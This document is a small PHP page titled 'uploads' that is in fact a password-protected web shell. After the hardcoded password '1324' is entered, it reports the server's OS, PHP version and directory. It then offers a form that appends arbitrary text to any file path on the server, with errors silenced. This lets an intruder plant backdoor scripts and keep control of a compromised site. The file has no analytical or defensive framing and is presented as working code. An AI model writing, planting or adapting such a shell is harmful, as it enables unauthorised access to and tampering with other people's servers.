<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>uploads</title>
</head>

<body>
<?php 
$MM = isset($_POST['MM']) ? $_POST['MM'] : '';
$get = isset($_GET['id']) ? $_GET['id'] : '';
$ps = '1324';
if($MM==$ps){
echo 'OS:' .PHP_OS.'<br />';
echo 'VER:'.PHP_VERSION.'<br />';
echo '<b style="color:red;">DIR:'.__DIR__ .'\\</b>';echo'<br /><hr />';
?>
<form action="?id=<?php echo $ps?>" method="post">
DIR:<input type="text" name="lujin"  style="width:300px;"/><br /><br />
<b>TEXT: </b><br /> <textarea name="neirong" style="width:500px; height:400px;"></textarea><hr/>
<input  type="submit" value="---ENTER---" style=" margin-left:200px;" /></p>
</form>
<?php exit;}elseif(isset($get) && !empty($get)  && $get==$ps){
        $lujin = @$_POST['lujin'];
        $neirong = @$_POST['neirong'];
         if (empty($lujin) || empty($neirong)) {
        echo 'DIR OR TEXT';
        exit;        
        }
        $fh = @fopen($lujin,'a');
        @fwrite($fh,$neirong);
        echo 'OK';
        echo '<hr />';
        echo 'youdir:'.$lujin;
        exit;
}?>
<form action="" method="post" style=" margin-top:200px; margin-left:40%;"><p>
ps: <input type="MM" name="MM" /></p>
<p>
<input type="submit" value="Enter" style=" margin-left:100px;"/>
</p>
</form>
</body>
</html>
